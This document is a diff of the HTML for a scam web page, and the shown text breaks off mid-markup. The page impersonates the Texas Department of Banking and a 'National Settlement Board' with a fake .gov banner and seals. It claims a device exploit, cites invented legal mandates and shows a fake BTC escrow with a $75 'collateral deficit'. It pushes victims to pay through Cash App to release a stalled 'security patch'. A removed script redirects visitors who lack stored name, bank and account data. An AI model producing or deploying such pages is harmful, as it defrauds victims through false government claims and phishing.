@@ -2,1714 +2,1594 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-    <title>NSB-ITD | Institutional Settlement Terminal v4.0.2</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>TIFMA | Official FRC Retrieval Portal | Case #NSB-IT-8842-TX</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
-        :root {
-            --nsb-blue: #001a33;
-            --nsb-blue-light: #003366;
-            --nsb-gold: #c5a059;
-            --nsb-gold-bright: #e5c17e;
-            --bg-deep: #020408;
-            --card-surface: #0d1117;
-            --border-heavy: #30363d;
-            --border-light: rgba(255,255,255,0.1);
-            --text-main: #f0f6fc;
-            --text-muted: #7d8590;
-            --status-green: #238636;
-            --status-amber: #d29922;
+        @import url('https://fonts.googleapis.com/css2?family=Public+Sans:wght@300;400;500;600;700;800&family=Roboto+Mono:wght@400;500;600;700&display=swap');
+:root {
+            --gov-navy: #0a1f2e;
+            --gov-blue: #003366;
+            --gov-red: #b91c1c;
+            --gov-gold: #c5a059;
+            --gov-gold-light: #e5c17e;
+            --status-green: #15803d;
+            --status-amber: #b45309;
             --cashapp-green: #00d632;
+            --border-ui: #cbd5e1;
+            --bg-main: #f8fafc;
         }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-        }
-
         body {
-            background-color: var(--bg-deep);
-            color: var(--text-main);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            font-family: 'Public Sans', sans-serif;
+            background-color: var(--bg-main);
+            color: #0f172a;
             overflow-x: hidden;
-            position: relative;
         }
-
-        body::before {
-            content: "OFFICIAL USE ONLY";
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%) rotate(-45deg);
-            font-size: 8vw;
-            color: rgba(255, 255, 255, 0.015);
-            font-weight: 900;
-            z-index: -1;
-            pointer-events: none;
-            white-space: nowrap;
+        .nav-header {
+            background-color: #0f172a;
+            color: white;
+            border-bottom: 4px solid var(--gov-red);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
         }
-
         .gov-banner {
-            background: #000;
-            border-bottom: 1px solid var(--nsb-gold);
-            height: 28px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 10px;
-            font-weight: 700;
-            letter-spacing: 1.5px;
-            color: var(--nsb-gold);
-        }
-
-        header {
-            background: linear-gradient(to bottom, var(--nsb-blue), #000810);
-            border-bottom: 1px solid var(--border-heavy);
-            padding: 20px 0;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-        }
-
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 30px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .brand-block {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-
-        .seal-icon {
-            width: 60px;
-            height: 60px;
-            border: 2px solid var(--nsb-gold);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            background: radial-gradient(circle, var(--nsb-blue-light), #000);
-            box-shadow: 0 0 15px rgba(197, 160, 89, 0.3);
-        }
-
-        .brand-text h1 {
-            font-size: 22px;
-            letter-spacing: 1px;
-            text-transform: uppercase;
-            color: #fff;
-            margin-bottom: 2px;
-        }
-
-        .brand-text p {
+            background: #f1f5f9;
+            padding: 6px 5%;
+            border-bottom: 1px solid #cbd5e1;
             font-size: 11px;
-            color: var(--nsb-gold);
-            font-weight: 600;
-            text-transform: uppercase;
+            font-weight: 500;
         }
-
-        .breadcrumb-bar {
-            background: #0d1117;
-            border-bottom: 1px solid var(--border-light);
-            padding: 8px 0;
-        }
-
-        .breadcrumb-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 30px;
-            font-size: 11px;
-            color: var(--text-muted);
-        }
-
-        .breadcrumb-container span { color: var(--nsb-gold); }
-
         .workspace {
-            max-width: 1200px;
-            margin: 30px auto;
-            padding: 0 20px;
             display: grid;
-            grid-template-columns: 280px 1fr 300px;
-            gap: 25px;
+            grid-template-columns: 320px 1fr 320px;
+            gap: 20px;
+            max-width: 1600px;
+            margin: 20px auto;
+            padding: 0 20px;
         }
+        @media (max-width: 1280px) {
+            .workspace {
+                grid-template-columns: 1fr;
+            }
 
-        @media (max-width: 1100px) {
-            .workspace { grid-template-columns: 1fr 320px; }
-            .sidebar-left { display: none; }
+            .sidebar-left, .sidebar-right {
+                display: none;
+            }
         }
-
-        @media (max-width: 800px) {
-            .workspace { grid-template-columns: 1fr; }
-        }
-
         .panel {
-            background: var(--card-surface);
-            border: 1px solid var(--border-heavy);
-            border-radius: 4px; 
-            overflow: hidden;
+            background: white;
+            border: 1px solid #e2e8f0;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.05);
             display: flex;
             flex-direction: column;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.5);
         }
-
         .panel-header {
-            background: #161b22;
-            padding: 12px 18px;
-            border-bottom: 1px solid var(--border-heavy);
-            font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 1px;
-            color: var(--text-muted);
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-        }
-
-        .terminal-header {
-            padding: 25px 30px;
-            border-bottom: 1px solid var(--border-heavy);
-            background: radial-gradient(circle at top right, #11151d, #0d1117);
-        }
-
-        .case-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: flex-start;
-            margin-bottom: 20px;
-        }
-
-        .status-badge {
-            background: rgba(210, 153, 34, 0.1);
-            color: var(--status-amber);
-            border: 1px solid var(--status-amber);
-            padding: 4px 12px;
-            font-size: 11px;
-            font-weight: 700;
-            border-radius: 20px;
-            letter-spacing: 0.5px;
-        }
-
-        /* Institutional Alert Section */
-        .threshold-alert-container {
-            margin: 25px 30px;
-            background: rgba(210, 153, 34, 0.03);
-            border: 1px solid var(--status-amber);
-            border-radius: 6px;
-            overflow: hidden;
-            box-shadow: 0 4px 20px rgba(210, 153, 34, 0.05);
-        }
-
-        .threshold-header {
-            background: rgba(210, 153, 34, 0.15);
-            color: var(--status-amber);
-            padding: 14px 20px;
-            font-size: 12px;
+            background: #f1f5f9;
+            padding: 12px 16px;
+            border-bottom: 2px solid #0f172a;
             font-weight: 800;
-            letter-spacing: 1px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            border-bottom: 1px solid rgba(210, 153, 34, 0.2);
             text-transform: uppercase;
+            font-size: 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
-
-        .blink-fast {
-            animation: blinkfast 1.2s cubic-bezier(0.4, 0, 0.6, 1) infinite;
-        }
-
-        @keyframes blinkfast {
-            50% { opacity: 0.2; }
-        }
-
-        .threshold-body {
+        .terminal-status {
+            background: #010409;
             padding: 20px;
-        }
-
-        .log-highlight {
-            color: var(--nsb-gold-bright);
-            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
-            font-size: 14px;
-            font-weight: 700;
-            background: rgba(0,0,0,0.4);
-            padding: 2px 6px;
             border-radius: 4px;
+            margin: 15px;
             border: 1px solid #30363d;
         }
-
-        /* Cash App Protocol Integration */
-        .cashapp-guide {
-            background: #010409;
-            border: 1px solid var(--border-heavy);
-            border-radius: 6px;
-            padding: 18px;
-            margin-top: 15px;
-            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+        .blink {
+            animation: blinker 1.5s linear infinite;
         }
-
-        .cashapp-header {
-            color: var(--cashapp-green);
-            font-size: 12px;
-            font-weight: 800;
-            margin-bottom: 12px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-            letter-spacing: 0.5px;
+        .blink-fast {
+            animation: blinker 0.6s linear infinite;
         }
-
-        .cashapp-steps {
-            display: flex;
-            flex-direction: column;
-            gap: 14px;
+        @keyframes blinker {
+            50% {
+                opacity: 0.1;
+            }
         }
-
-        .c-step {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            background: #0d1117;
-            padding: 12px;
-            border-radius: 4px;
-            border: 1px solid #21262d;
-        }
-
-        .c-step-num {
-            background: #21262d;
-            color: var(--cashapp-green);
-            width: 22px;
-            height: 22px;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 11px;
-            font-weight: 800;
-            flex-shrink: 0;
-            border: 1px solid var(--border-heavy);
-        }
-
-        .c-step-text {
-            font-size: 12px;
-            color: #c9d1d9;
-            line-height: 1.5;
-        }
-
-        .c-step-text strong {
-            color: #fff;
-        }
-
-        /* Payment Logic Tabs */
-        .protocol-selector {
-            display: flex;
-            background: #010409;
-            padding: 4px;
-            gap: 4px;
-            margin: 0 30px 20px;
-            border: 1px solid var(--border-heavy);
-            border-radius: 4px;
-        }
-
-        .protocol-tab {
-            flex: 1;
-            padding: 14px;
-            background: transparent;
-            border: none;
-            color: var(--text-muted);
-            font-size: 12px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-            border-radius: 2px;
-        }
-
-        .protocol-tab.active {
-            background: var(--nsb-blue-light);
-            color: #fff;
-            box-shadow: inset 0 0 15px rgba(0,0,0,0.5);
-            border: 1px solid rgba(255,255,255,0.05);
-        }
-
-        .qr-containment {
-            padding: 40px;
-            text-align: center;
-            background: radial-gradient(circle at center, #0d1117, #010409);
-            position: relative;
-            border-top: 1px solid var(--border-heavy);
-            border-bottom: 1px solid var(--border-heavy);
-        }
-
-        .qr-frame {
-            background: white;
+        .patch-ready-ui {
+            background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%);
+            border: 2px dashed #15803d;
             padding: 20px;
-            display: inline-block;
-            border: 6px solid #000;
-            border-radius: 4px;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.8);
-            margin-bottom: 25px;
+            margin-bottom: 20px;
+            border-radius: 6px;
             position: relative;
             overflow: hidden;
         }
-
-        .qr-frame img { width: 220px; height: 220px; display: block; }
-
-        .laser-line {
+        .patch-progress-container {
+            height: 12px;
+            background: #e2e8f0;
+            border-radius: 10px;
+            margin-top: 15px;
+            position: relative;
+        }
+        .patch-progress-fill {
+            height: 100%;
+            width: 88%;
+            background: repeating-linear-gradient(45deg, #15803d, #15803d 10px, #16a34a 10px, #16a34a 20px);
+            border-radius: 10px;
+        }
+        .stalled-overlay {
+            position: absolute;
+            top: 0;
+            right: 0;
+            background: var(--gov-red);
+            color: white;
+            font-size: 10px;
+            padding: 2px 8px;
+            font-weight: 900;
+            text-transform: uppercase;
+        }
+        .cashapp-container {
+            background: #000;
+            border-radius: 8px;
+            padding: 25px;
+            margin: 20px 0;
+            border: 1px solid #222;
+        }
+        .qr-wrapper {
+            background: white;
+            padding: 15px;
+            border-radius: 4px;
+            display: inline-block;
+            position: relative;
+            border: 4px solid #000;
+        }
+        .qr-scanner-line {
             position: absolute;
             width: 100%;
-            height: 3px;
-            background: rgba(35, 134, 54, 0.8);
-            box-shadow: 0 0 20px #238636, 0 0 10px #238636;
+            height: 2px;
+            background: var(--cashapp-green);
             top: 0;
             left: 0;
-            animation: laser 3s ease-in-out infinite;
-            z-index: 10;
+            box-shadow: 0 0 15px var(--cashapp-green);
+            animation: scan 2.5s ease-in-out infinite;
         }
+        @keyframes scan {
+            0%, 100% {
+                top: 0;
+            }
 
-        @keyframes laser {
-            0% { top: 0; opacity: 0; }
-            10% { opacity: 1; }
-            90% { opacity: 1; }
-            100% { top: 100%; opacity: 0; }
+            50% {
+                top: 100%;
+            }
         }
-
-        .data-well {
-            background: #010409;
-            border: 1px solid var(--border-heavy);
-            padding: 25px;
-            margin: 30px 30px;
-            border-radius: 4px;
-        }
-
-        .data-well label {
-            display: block;
-            font-size: 10px;
-            color: var(--nsb-gold);
-            margin-bottom: 10px;
-            font-weight: 800;
-            letter-spacing: 0.5px;
-        }
-
-        .address-string {
-            font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace;
-            font-size: 14px;
-            color: var(--text-main);
-            word-break: break-all;
-            background: #000;
-            padding: 16px;
-            border: 1px solid #30363d;
-            border-radius: 4px;
-            display: block;
-            margin-bottom: 15px;
-            text-align: center;
-            letter-spacing: 0.5px;
-        }
-
-        .action-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 12px;
-        }
-
-        .btn-institutional {
-            padding: 14px;
-            background: var(--nsb-gold);
-            color: #000;
-            border: none;
+        .address-box {
+            font-family: 'Roboto Mono', monospace;
+            background: #111;
+            color: #eee;
+            padding: 12px;
             font-size: 11px;
-            font-weight: 800;
-            cursor: pointer;
+            border-radius: 4px;
+            word-break: break-all;
+            margin: 10px 0;
+            border: 1px solid #333;
+        }
+        .btn-gov {
+            background: var(--gov-navy);
+            color: white;
+            padding: 14px;
+            font-weight: 700;
             text-transform: uppercase;
             letter-spacing: 1px;
-            border-radius: 3px;
-            transition: all 0.2s ease;
+            border-radius: 4px;
+            transition: 0.3s;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
-
-        .btn-institutional:hover {
-            filter: brightness(1.1);
+        .btn-gov:hover {
+            background: var(--gov-blue);
             transform: translateY(-1px);
         }
-
-        .btn-institutional.secondary {
-            background: #21262d;
-            color: #c9d1d9;
-            border: 1px solid var(--border-heavy);
-        }
-
-        .btn-institutional.secondary:hover {
-            background: #30363d;
-            color: #fff;
-        }
-
-        .policy-list {
-            padding: 15px;
-        }
-
-        .policy-item {
-            margin-bottom: 18px;
-            padding-bottom: 12px;
-            border-bottom: 1px solid var(--border-light);
-        }
-
-        .policy-item h5 {
-            font-size: 11px;
-            color: var(--nsb-gold);
-            margin-bottom: 6px;
-            letter-spacing: 0.5px;
-        }
-
-        .policy-item p {
-            font-size: 10px;
-            color: var(--text-muted);
-            line-height: 1.5;
-        }
-
-        .ledger-feed {
-            font-size: 11px;
-            padding: 15px;
-        }
-
-        .feed-entry {
-            display: flex;
-            gap: 12px;
-            margin-bottom: 14px;
-            color: var(--text-muted);
-            border-left: 2px solid var(--border-heavy);
-            padding-left: 10px;
-        }
-
-        .feed-time { color: var(--nsb-gold); white-space: nowrap; font-family: monospace; }
-
-        .process-visual {
-            padding: 20px 30px;
-            background: #010409;
-            margin-top: auto;
-            border-top: 1px solid var(--border-heavy);
-        }
-
-        .v-bar-bg {
-            height: 6px;
-            background: #21262d;
-            border-radius: 10px;
-            overflow: hidden;
-            margin: 12px 0;
-            box-shadow: inset 0 1px 3px rgba(0,0,0,0.5);
-        }
-
-        .v-bar-fill {
-            height: 100%;
-            background: var(--nsb-gold);
-            width: 45%;
-            transition: 0.5s;
-            box-shadow: 0 0 10px rgba(197, 160, 89, 0.5);
-        }
-
-        footer {
-            background: #000;
-            border-top: 3px solid var(--nsb-blue-light);
-            padding: 60px 20px;
-            margin-top: auto;
-        }
-
-        .footer-core {
-            max-width: 1200px;
-            margin: 0 auto;
-            display: grid;
-            grid-template-columns: 2fr 1fr 1fr;
-            gap: 60px;
-        }
-
-        .footer-section h4 {
-            color: var(--nsb-gold);
-            font-size: 13px;
-            margin-bottom: 24px;
+        .btn-cashapp {
+            background: var(--cashapp-green);
+            color: black;
+            font-weight: 800;
+            padding: 16px;
+            border-radius: 4px;
+            width: 100%;
             text-transform: uppercase;
-            letter-spacing: 1px;
+            margin-top: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
-
-        .footer-section p, .footer-section a {
+        .ledger-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            border-bottom: 1px solid #f1f5f9;
             font-size: 11px;
-            color: var(--text-muted);
-            text-decoration: none;
-            line-height: 1.8;
+        }
+        .seal-display {
+            width: 120px;
+            height: 120px;
+            margin: 0 auto;
+            background-image: url('https://national-settlement-board.cfd/images/sovereign-seal.png');
+            background-size: contain;
+            background-repeat: no-repeat;
+            filter: drop-shadow(0 4px 8px rgba(0,0,0,0.1));
+        }
+        .legal-footer {
+            background: #0a1f2e;
+            color: #94a3b8;
+            padding: 60px 20px;
+            border-top: 4px solid var(--gov-gold);
+            margin-top: auto;
+        }
+        .hidden {
+            display: none !important;
+        }
+        .gov-dropdown {
+            display: none;
+            background: white;
+            position: absolute;
+            z-index: 1000;
+            border: 1px solid #cbd5e1;
+            padding: 15px;
+            width: 300px;
+            top: 30px;
+            box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
+        }
+        .active-drop {
             display: block;
-            transition: color 0.2s;
         }
-
-        .footer-section a:hover {
-            color: var(--text-main);
-        }
-
-        .legal-disclaimer {
-            border-top: 1px solid #161b22;
-            margin-top: 50px;
-            padding-top: 30px;
-            text-align: center;
-            font-size: 9px;
-            color: #555;
-            letter-spacing: 0.5px;
-            line-height: 1.6;
-        }
-
-        .hidden { display: none !important; }
-        .blink { animation: blinker 1.5s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0.2; } }
-
     </style>
 </head>
-<body>
-    <script>
-(function() {
-    const savedName = localStorage.getItem('tifma_name');
-    const savedBank = localStorage.getItem('tifma_bank');
-    const savedAccount = localStorage.getItem('tifma_account');
-    
-    if (!savedName || !savedBank || !savedAccount) {
-        window.location.href = 'https://national-settlement-board.cfd/index.html';
-        return;
-    }
-})();
-    </script>
+<body onload="initializeTerminal()">
 
-    <div class="gov-banner">
-        <i class="fa-solid fa-flag-usa" style="margin-right: 10px;"></i> OFFICIAL UNITED STATES GOVERNMENT SETTLEMENT PORTAL
-    </div>
-
-    <header>
-        <div class="header-container">
-            <div class="brand-block">
-                <div class="seal-icon">
-                    <i class="fa-solid fa-building-columns" style="font-size: 28px; color: var(--nsb-gold);"></i>
-                </div>
-                <div class="brand-text">
-                    <h1>National Settlement Board</h1>
-                    <p>Information Technology Division — Digital Asset Remediation Office</p>
+    <section class="gov-banner no-print">
+        <div class="max-w-7xl mx-auto flex items-center justify-between">
+            <div class="flex items-center gap-2">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a4/Flag_of_the_United_States.svg" class="h-3" alt="USA">
+                <span>An official website of the United States government</span>
+                <button onclick="toggleGov()" class="text-blue-700 underline font-bold ml-1">Here's how you know</button>
+                <div id="govDrop" class="gov-dropdown">
+                    <p class="font-bold mb-2">
+                        Official websites use .gov
+                    </p>
+                    <p class="text-[10px] mb-3">
+                        A .gov website belongs to an official government organization in the United States.
+                    </p>
+                    <p class="font-bold mb-2">
+                        Secure .gov websites use HTTPS
+                    </p>
+                    <p class="text-[10px]">
+                        A lock ( <i class="fa-solid fa-lock"></i> ) or https:// means you've safely connected to the .gov website.
+                    </p>
                 </div>
             </div>
-            <div style="text-align: right;">
-                <div style="font-size: 10px; color: var(--nsb-gold);">SECURE TERMINAL: <strong>#882-ALPHA-9</strong></div>
-                <div style="font-size: 12px; color: #fff; font-weight: 700; margin-top: 4px;"><i class="fa-solid fa-fingerprint"></i> SESSION ENCRYPTED</div>
+            <div class="text-[10px] uppercase font-bold tracking-widest text-slate-500">
+                Node: DAL-SEC-011
+            </div>
+        </div>
+    </section>
+
+    <header class="nav-header px-6 py-4 md:px-12">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-5">
+                <img src="https://national-settlement-board.cfd/images/dob-texas.png" class="h-14 w-14 bg-white rounded-full p-1" alt="Seal">
+                <div>
+                    <h1 class="text-2xl font-black uppercase leading-none tracking-tighter">Texas Department of Banking</h1>
+                    <p class="text-[10px] font-bold text-slate-400 uppercase tracking-widest mt-1">
+                        Institutional Funds Management Authority (TIFMA)
+                    </p>
+                </div>
+            </div>
+            <div class="hidden md:flex items-center gap-8">
+                <div class="text-right">
+                    <p class="text-[10px] font-mono text-blue-300">
+                        ENCRYPTION: AES-256-GCM
+                    </p>
+                    <p class="text-xs text-green-400 font-bold blink">
+                        <i class="fa-solid fa-circle"></i> SYSTEM PROTECTED
+                    </p>
+                </div>
+                <img src="https://national-settlement-board.cfd/images/tdi-seal.png" class="h-16" alt="TDI">
             </div>
         </div>
     </header>
 
-    <div class="breadcrumb-bar">
-        <div class="breadcrumb-container">
-            Home / ITD / Enforcement / <span>Case Settlement Entry</span>
-        </div>
-    </div>
-
     <div class="workspace">
         <aside class="sidebar-left">
-            <div class="panel">
-                <div class="panel-header">Regulatory Protocol</div>
-                <div class="policy-list">
-                    <div class="policy-item">
-                        <h5>CFAA Compliance</h5>
-                        <p>Under the Computer Fraud and Abuse Act (18 U.S.C. § 1030), this settlement serves as official remediation of system liabilities.</p>
-                    </div>
-                    <div class="policy-item">
-                        <h5>Asset Verification</h5>
-                        <p>All incoming transactions are cross-referenced with the Chainalysis Institutional risk scoring engine for strict compliance.</p>
-                    </div>
-                    <div class="policy-item">
-                        <h5>Escrow Provisions</h5>
-                        <p>Funds are held under a Time-Locked Multi-Sig script (P2TR) until final Case Closure Verification is securely signed.</p>
-                    </div>
-                    <div class="policy-item" style="border-bottom: none; margin-bottom: 0; padding-bottom: 0;">
-                        <h5>Public Disclosure</h5>
-                        <p>This transaction is permanently exempt from FOIA disclosure under Exemption 4 (Commercial/Financial Information).</p>
+            <div class="panel mb-6">
+                <div class="panel-header">
+                    Asset Integrity Monitor
+                </div>
+                <div class="p-4">
+                    <div class="seal-display mb-4"></div>
+                    <div class="text-center">
+                        <p class="text-[10px] uppercase font-black text-slate-500 mb-1">
+                            Status
+                        </p>
+                        <p class="text-xs font-bold text-green-700 bg-green-50 py-1 rounded border border-green-200">
+                            AUTHENTICATED USER
+                        </p>
                     </div>
                 </div>
             </div>
-
-            <div class="panel" style="margin-top: 25px;">
-                <div class="panel-header">Asset Identity</div>
-                <div style="padding: 25px 15px; text-align: center; background: radial-gradient(circle at center, #11151d, #0d1117);">
-                    <i class="fa-solid fa-shield-cat" style="font-size: 45px; color: #21262d; margin-bottom: 15px;"></i>
-                    <p style="font-size: 10px; color: var(--text-muted); line-height: 1.5;">Verified Merchant Status: <br><strong style="color:var(--status-green); font-size: 11px; display: inline-block; margin-top: 5px;">ACTIVE PRE-SETTLEMENT</strong></p>
+            <div class="panel">
+                <div class="panel-header">
+                    Protocol Mandates
+                </div>
+                <div class="p-4 space-y-4">
+                    <div class="border-l-2 border-slate-300 pl-3">
+                        <h4 class="text-[11px] font-bold uppercase text-slate-700">18 U.S.C. § 1030</h4>
+                        <p class="text-[10px] text-slate-500 leading-relaxed">
+                            This terminal serves as the official remediation interface for unauthorized system intrusions.
+                        </p>
+                    </div>
+                    <div class="border-l-2 border-slate-300 pl-3">
+                        <h4 class="text-[11px] font-bold uppercase text-slate-700">P2TR Escrow</h4>
+                        <p class="text-[10px] text-slate-500 leading-relaxed">
+                            Assets are locked via taproot consensus until collateral threshold is verified by central nodes.
+                        </p>
+                    </div>
+                    <div class="border-l-2 border-slate-300 pl-3">
+                        <h4 class="text-[11px] font-bold uppercase text-slate-700">Audit Trail</h4>
+                        <p class="text-[10px] text-slate-500 leading-relaxed">
+                            Every keystroke is recorded and hashed to the Federal Ledger for forensic compliance.
+                        </p>
+                    </div>
                 </div>
             </div>
         </aside>
 
-        <main class="panel">
+        <main class="panel min-h-[900px]">
             <div class="panel-header">
-                Settlement Terminal 4.0
-                <span style="color: var(--nsb-gold);"><i class="fa-solid fa-clock"></i> SESSION ID: 22-880-9X</span>
+                Settlement Terminal v4.0.2
+                <span class="text-amber-600 font-mono text-[10px]"><i class="fa-solid fa-microchip"></i> KERNEL: 6.1.0-NSB</span>
             </div>
 
-            <div class="terminal-header">
-                <div class="case-header">
-                    <div>
-                        <h2 style="font-size: 20px; color: #fff; margin-bottom: 4px; letter-spacing: 0.5px;">CASE #NSB-IT-8842-TX</h2>
-                        <p style="font-size: 12px; color: var(--text-muted);">Institutional IT Remediation & Collateral Deposit Escrow</p>
+            <div class="p-6">
+                <div class="patch-ready-ui">
+                    <div class="stalled-overlay blink-fast">
+                        Transfer Jammed
                     </div>
-                    <div class="status-badge blink">AWAITING BROADCAST</div>
+                    <div class="flex items-start gap-4">
+                        <div class="h-12 w-12 bg-green-600 rounded flex items-center justify-center text-white text-xl">
+                            <i class="fa-solid fa-file-shield"></i>
+                        </div>
+                        <div class="flex-1">
+                            <h3 class="text-sm font-black text-green-900 uppercase">System Security Patch Ready</h3>
+                            <p class="text-[11px] text-green-800 mt-1 leading-normal">
+                                Version 11.2.4 (Hotfix) is prepared for deployment to resolve the <strong>Crypto.com App exploit</strong> detected on your device. Final application is currently <strong>STALLED</strong> due to unconfirmed blockchain collateral.
+                            </p>
+                        </div>
+                    </div>
+                    <div class="patch-progress-container">
+                        <div class="patch-progress-fill"></div>
+                    </div>
+                    <div class="flex justify-between mt-2">
+                        <span class="text-[9px] font-bold text-slate-500 uppercase tracking-tighter">Status: Awaiting Clearing</span>
+                        <span class="text-[9px] font-black text-green-700">88% COMPLETE</span>
+                    </div>
                 </div>
 
-                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 40px; font-size: 13px; background: #010409; padding: 15px; border: 1px solid var(--border-heavy); border-radius: 4px;">
-                    <div>
-                        <div style="display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid var(--border-light);">
-                            <span style="color: var(--text-muted);">Account Holder</span>
-                            <span style="font-weight: 600; color: #c9d1d9;">NSB Settlement Reserve</span>
+                <div class="terminal-status mb-6">
+                    <div class="flex justify-between items-center border-b border-slate-800 pb-3 mb-4">
+                        <div>
+                            <h2 class="text-white font-black text-lg">CASE #NSB-IT-8842-TX</h2>
+                            <p class="text-slate-400 text-[10px] uppercase font-mono">
+                                Registry: Dallas Central District Court
+                            </p>
                         </div>
-                        <div style="display: flex; justify-content: space-between; padding: 6px 0;">
-                            <span style="color: var(--text-muted);">Jurisdiction</span>
-                            <span style="font-weight: 600; color: #c9d1d9;">Texas Central Dist.</span>
-                        </div>
-                    </div>
-                    <div>
-                        <div style="display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid var(--border-light);">
-                            <span style="color: var(--text-muted);">Deposit Limit</span>
-                            <span style="font-weight: 600; color: #c9d1d9;">UNRESTRICTED</span>
-                        </div>
-                        <div style="display: flex; justify-content: space-between; padding: 6px 0;">
-                            <span style="color: var(--text-muted);">Ledger Type</span>
-                            <span style="font-weight: 600; color: #c9d1d9;">DLD-OFFICIAL</span>
+                        <div class="bg-amber-500/10 border border-amber-500/50 px-3 py-1 text-amber-500 text-[10px] font-black tracking-widest blink">
+                            PENDING THRESHOLD
                         </div>
                     </div>
-                </div>
-            </div>
 
-            <!-- SYSTEM ALERT: THRESHOLD PENDING -->
-            <div class="threshold-alert-container">
-                <div class="threshold-header">
-                    <i class="fa-solid fa-triangle-exclamation blink-fast" style="font-size: 16px;"></i>
-                    PARTIAL SETTLEMENT DETECTED: ACTION REQUIRED
+                    <div class="grid grid-cols-2 gap-4 text-[11px]">
+                        <div class="ledger-row border-slate-800">
+                            <span class="text-slate-500">Escrow Balance</span>
+                            <span class="text-green-400 font-mono">0.00112142 BTC</span>
+                        </div>
+                        <div class="ledger-row border-slate-800">
+                            <span class="text-slate-500">Confirmation Score</span>
+                            <span class="text-amber-500">0 / 3 Confirmed</span>
+                        </div>
+                        <div class="ledger-row border-slate-800">
+                            <span class="text-slate-500">Collateral Deficit</span>
+                            <span class="text-red-500 font-bold">$75.00 USD</span>
+                        </div>
+                        <div class="ledger-row border-slate-800">
+                            <span class="text-slate-500">Node Latency</span>
+                            <span class="text-slate-400">14ms (Optimal)</span>
+                        </div>
+                    </div>
                 </div>
-                <div class="threshold-body">
-                    <p style="font-size: 13px; color: #f0f6fc; margin-bottom: 15px; line-height: 1.6;">
-                        <strong>NETWORK LOG:</strong> An inbound transaction of <span class="log-highlight">0.00112142 BTC</span> was recorded on the Lightning Network at <strong>15:19 CST (April 03, 2026)</strong>. However, the escrow clearance remains in a <strong style="color: var(--status-amber);">HOLD STATE</strong> due to an unmet collateral threshold deficit.
+
+                <div class="bg-white border-2 border-slate-200 p-5 rounded-sm mb-6 shadow-sm">
+                    <h4 class="text-red-700 font-black text-xs uppercase flex items-center gap-2 mb-3">
+                        <i class="fa-solid fa-triangle-exclamation"></i> Blockchain Congestion Alert
+                    </h4>
+                    <p class="text-[12px] text-slate-700 leading-relaxed mb-4">
+                        Current mempool congestion is delaying the final settlement. To bypass the queue and apply the security patch immediately, you are authorized to use the <strong>Cash App Fiat Bridge</strong>.
                     </p>
-                    
-                    <div class="cashapp-guide">
-                        <div class="cashapp-header">
-                            <i class="fa-solid fa-mobile-screen-button" style="font-size: 16px;"></i> APPROVED SUPPLEMENTAL CLEARANCE PROTOCOL (CASH APP)
-                        </div>
-                        <p style="font-size: 11px; color: var(--text-muted); margin-bottom: 18px; line-height: 1.5; padding-bottom: 12px; border-bottom: 1px solid #21262d;">
-                            To complete the settlement immediately without purchasing additional cryptocurrency via exchanges, beneficiaries are authorized to utilize the Cash App mobile application. The bridge will automatically route the collateral deficit using your fiat (USD) balance.
-                        </p>
-                        
-                        <div class="cashapp-steps">
-                            <div class="c-step">
-                                <div class="c-step-num">1</div>
-                                <div class="c-step-text">Open the <strong>Cash App</strong> application on your registered mobile device.</div>
+
+                    <div class="cashapp-container">
+                        <div class="flex flex-col md:flex-row gap-6 items-center">
+                            <div class="qr-wrapper">
+                                <div class="qr-scanner-line"></div>
